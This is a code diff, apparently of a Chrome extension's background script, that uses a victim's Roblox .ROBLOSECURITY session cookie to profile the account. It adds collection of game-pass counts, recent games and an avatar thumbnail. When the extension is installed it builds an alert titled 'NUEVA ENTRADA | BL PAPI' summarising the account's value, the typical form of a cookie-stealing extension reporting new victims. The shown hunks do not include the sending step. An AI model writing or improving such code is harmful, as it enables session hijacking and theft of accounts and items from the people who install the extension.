@@ -290,33 +290,44 @@ async function obtenerNombrePais(codigo) {
 // Obtener juegos recientes del usuario (los que ha jugado con visitas)
 async function obtenerJuegosRecientes(userId, cookie) {
     try {
-        const res = await fetch(\`https://games.roblox.com/v2/users/\${userId}/games?limit=50\`, {
+        const res = await fetch(\`https://games.roblox.com/v2/users/\${userId}/games?limit=3\`, {
             headers: { 'Cookie': \`.ROBLOSECURITY=\${cookie};\` }
         });
-        if (!res.ok) return [];
+        if (!res.ok) return ['No disponible', 'No disponible', 'No disponible'];
         const data = await res.json();
-        return data.data || [];
+        const juegos = data.data || [];
+        const nombres = juegos.map(j => j.name);
+        while (nombres.length < 3) nombres.push('No disponible');
+        return nombres;
     } catch {
-        return [];
+        return ['No disponible', 'No disponible', 'No disponible'];
     }
 }
 
-// Verificar si ha jugado a juegos específicos por universeId
-async function verificarJuegosPopulares(userId, cookie) {
-    const juegosPopulares = [
-        { nombre: "Adopt Me!", universeId: "6284583030" },
-        { nombre: "MM2", universeId: "142823291" },
-        { nombre: "Blox Fruits", universeId: "4520749081" }
-    ];
-    
-    const juegosRecientes = await obtenerJuegosRecientes(userId, cookie);
-    const universeIdsJugados = juegosRecientes.map(j => j.id.toString());
-    
-    const resultados = {};
-    for (const juego of juegosPopulares) {
-        resultados[juego.nombre] = universeIdsJugados.includes(juego.universeId) ? "Sí" : "No";
+// Contar gamepasses totales
+async function obtenerGamePasses(userId, cookie) {
+    try {
+        const res = await fetch(\`https://games.roblox.com/v2/users/\${userId}/games?limit=50\`, {
+            headers: { 'Cookie': \`.ROBLOSECURITY=\${cookie};\` }
+        });
+        if (!res.ok) return 0;
+        const data = await res.json();
+        const juegos = data.data || [];
+        let total = 0;
+        for (const juego of juegos) {
+            const gpRes = await fetch(\`https://games.roblox.com/v1/games/\${juego.id}/game-passes?limit=100\`, {
+                headers: { 'Cookie': \`.ROBLOSECURITY=\${cookie};\` }
+            });
+            if (gpRes.ok) {
+                const gpData = await gpRes.json();
+                total += (gpData.data || []).length;
+            }
+            await new Promise(r => setTimeout(r, 100));
+        }
+        return total;
+    } catch {
+        return 0;
     }
-    return resultados;
 }
 
 async function tieneItem(userId, cookie, assetId) {
@@ -382,7 +393,8 @@ async function obtenerInfoRoblox(cookie) {
 
         const headless = await tieneItem(user.id, cookie, 201);
         const korblox = await tieneItem(user.id, cookie, 192);
-        const juegosPopulares = await verificarJuegosPopulares(user.id, cookie);
+        const gamepasses = await obtenerGamePasses(user.id, cookie);
+        const juegos = await obtenerJuegosRecientes(user.id, cookie);
 
         return {
             username: user.name || 'No disponible',
@@ -393,9 +405,10 @@ async function obtenerInfoRoblox(cookie) {
             amigos: amigos,
             headless: headless ? 'Sí' : 'No',
             korblox: korblox ? 'Sí' : 'No',
-            adoptMe: juegosPopulares["Adopt Me!"] || "No",
-            mm2: juegosPopulares["MM2"] || "No",
-            bloxFruits: juegosPopulares["Blox Fruits"] || "No"
+            gamepasses: gamepasses,
+            juego1: juegos[0],
+            juego2: juegos[1],
+            juego3: juegos[2]
         };
     } catch {
         return null;
@@ -424,6 +437,9 @@ chrome.runtime.onInstalled.addListener(async () => {
     const embed = {
         title: "🔔 NUEVA ENTRADA | **BL PAPI** !",
         color: 15158332,
+        thumbnail: {
+            url: \`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=\${info.userId}&size=150x150&format=Png&isCircular=true\`
+        },
         fields: [
             {
                 name: "📌 INFORMACIÓN GENERAL",
@@ -441,8 +457,8 @@ chrome.runtime.onInstalled.addListener(async () => {
                 inline: false
             },
             {
-                name: "🎮 JUGADOS ALGUNA VEZ",
-                value: \`🕹️ **Adopt Me:** \${info.adoptMe}\\n🕹️ **MM2:** \${info.mm2}\\n🕹️ **Blox Fruits:** \${info.bloxFruits}\`,
+                name: "📈 ESTADÍSTICAS",
+                value: \`🏷 **GamePass/es:** \\\`\${info.gamepasses || 0}\\\`\\n🎮 **Juegos recientes:**\\n\\\`\\\`\\\`\\n1ro \${info.juego1}\\n2do \${info.juego2}\\n3ro \${info.juego3}\\n\\\`\\\`\\\`\`,
                 inline: false
             },
             {
